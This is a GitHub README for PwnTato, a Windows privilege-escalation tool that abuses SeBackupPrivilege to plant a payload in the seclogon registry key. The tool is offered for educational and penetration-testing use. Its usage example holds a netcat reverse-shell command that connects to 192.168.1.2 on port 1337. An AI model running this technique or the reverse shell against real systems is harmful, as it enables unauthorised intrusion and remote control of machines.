# PwnTato

PwnTato is a simple utility written in PureBasic that leverages the SeBackupPrivilege token privilege to inject a payload into the `seclogon` registry key. This tool is designed for educational and testing purposes only.

![PwnTato Logo](https://i.imgur.com/XDE367N.png)

## Features

- **SeBackupPrivilege Injection:** PwnTato injects the SeBackupPrivilege token privilege into the process to manipulate registry keys.

- **Registry Key Manipulation:** The tool allows users to input a custom payload, which is then written to the `seclogon` registry key.

## Prerequisites

- Windows operating system
- PureBasic compiler (for compilation)

## Usage

```shell



              ██      ██  ██
            ██  ██  ██  ██  ██  ██████
          ██  ██  ████  ██    ██    ██
        ██      ██  ██    ██  ██    ██
          ████  ██    ██    ██    ██
            ████  ██    ██  ██  ████
            ██▒▒████████████████▒▒██
            ██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██
            ██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██
            ██▒▒██  ▒▒▒▒▒▒▒▒  ██▒▒██
            ██▒▒████▒▒▒▒▒▒▒▒████▒▒██
            ██▒▒▒▒▒▒▒▒████▒▒▒▒▒▒▒▒██
            ██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██
            ████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒████
              ████████████████████
                      v1.0
               PwnTato by @duty1g


[+] SeBackupPrivilege token injected to the process
[!] Enter your seclogon payload: c:\windows\temp\nc.exe 192.168.1.2 1337 -e cmd.exe      

```

## Binaries

Download the latest release from the [Releases](https://github.com/duty1g/PwnTato/releases) page. Choose the appropriate binary for your system.


## Disclaimer

This tool is intended for educational and testing purposes only. The author is not responsible for any misuse or damage caused by the use of this tool.

## Author

- duty1g <a href="https://twitter.com/duty_1g"><img src="https://img.shields.io/twitter/follow/duty_1g.svg?logo=twitter"></a>

Feel free to contribute or report issues!
